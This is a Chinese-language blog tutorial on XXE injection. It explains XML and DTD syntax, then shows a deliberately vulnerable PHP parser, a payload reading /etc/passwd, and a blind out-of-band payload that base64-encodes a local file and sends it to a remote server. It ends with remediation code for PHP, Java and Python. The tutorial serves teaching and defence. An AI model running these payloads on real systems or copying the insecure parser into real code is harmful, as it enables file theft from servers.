---
layout: post
title: "xxe漏洞攻防"
date: 2018-1-23
tags:
  web
categories:
  Web
---
# 0x01 XML基础
xml是用于传输存储数据，并非像html一样显示数据的，直接举个例子说明：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<mail date="2017.1.21">
  <to>A</to>
  <from>B</from>
  <content>
    Happy new year , A
  </content>
</mail>
```

语法类似于html，但xml没有预定义标签，一切标签都由使用者创建，xml文档必须要有根元素，如上mail，标签名大小写敏感

# 0x02 文档类型定义

文档类型定义(DTD)，是定义xml文档的结构的模块，可以声明在xml文档内部，也可以作为外部引用，作为内部声明如下例：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE mail [
  <!ELEMENT mail (to,from,content)>
  <!ATTLIST mail date CDATA "2017.1.21">
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT content (#PCDATA)>
]>
<mail date="2017.1.21">
  <to>A</to>
  <from>B</from>
  <content>
    Happy new year , A
  </content>
</mail>
```

作为外部引用时，DTD单独作为一个文件被xml文档引用，如下例：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE mail SYSTEM "xxx.dtd">
<mail date="2017.1.21">
  <to>A</to>
  <from>B</from>
  <content>
    Happy new year , A
  </content>
</mail>
```

语法不复杂，简单提一些重点：

* 如果dtd位于xml文档内部声明中，那么需要封装在<!DOCTYPE>定义中，``<!DOCTYPE 根元素 [...]>``
* 如果在外部，``<!DOCTYPE 根元素 SYSTEM "URI">``
* PCDATA(被解析的字符数据)，是会被解析的文本，CDATA(字符数据)，是不会被解析器解析的文本
* 元素声明用``<!ELEMENT 元素名 (结构)>``
* 属性声明用``<!ATTLIST 元素名 属性名 类型 “值”>``


既然xxe漏洞涉及到实体的引用，再简单介绍下实体，内部实体：

```xml
<!ENTITY 实体名 “值”>
```

外部实体：

```xml
<!ENTITY 实体名 SYSTEM "URI">
```

参数实体：

```xml
<!ENTITY % 实体名 “值”>
//或者
<!ENTITY % 实体名 SYSTEM "URI">
```
# 0x03 xml外部实体注入(XXE)

讲了那么多，防止自己以后看不懂，现在这才是我们的重点，xml外部实体注入攻击，在xml文档中，``SYSTEM``关键字会令xml解析器去读取URI的内容，攻击者可以构造自定义的URI，可造成任意文件读取，SSRF，拒绝服务攻击，命令执行等漏洞，不同程序支持协议不同：

![](http://4o4notfound.org/usr/uploads/2017/04/2786301042.png)

```php
<?php
    //让php允许外部实体
    libxml_disable_entity_loader(false);

    $xml = file_get_contents('php://input');

    $dom=DOMDocument::loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
    //LIBXML_NOENT:将XML中的实体引用替换成对应的值
    //LIBXML_DTDLOAD：加载 DOCTYPE 中的DTD文件

    $test = simplexml_import_dom($dom);
    //simplexml_import_dom：从DOM节点获取一个SimpleXMLElement对象。
    $user = $test->user;
    echo "test xml external entity: $user";
?>
```

post数据：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [
<!ELEMENT test ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<test>
<user>&xxe;</user>
</test>
```

![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/xxe-readfile.png?raw=true)

当页面无回显时，也就是**blind xxe**，可以使用php伪协议进行文件读取，post如下数据：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY % remote SYSTEM	"http://127.0.0.1/test.xml">
%remote;
]>
```
test.xml为
```
<!ENTITY % payload	SYSTEM	 "php://filter/read=convert.base64-encode/resource=file:///etc/issue">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1/?%payload;'>">
%int;
%trick;
```
![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/blind-xxe.png?raw=true)

在本地日志中可以看见base64编码的``/etc/issue``文件的内容``Kali GNU/Linux Rolling \n \l
``在实际利用时将本地改为vps地址，即可在vps的日志中读取文件内容，在php开启``expect``扩展时可以执行命令

# 0x04 修复方案

* 禁止外部实体引用

```
PHP：
libxml_disable_entity_loader(true);

JAVA:
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

Python：
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

* 过滤用户提交的xml数据中的DTD声明，实体声明，外部资源请求：``<!DOCTYPE``，``<!ENTITY``，``SYSTEM``
，``PUBLIC``
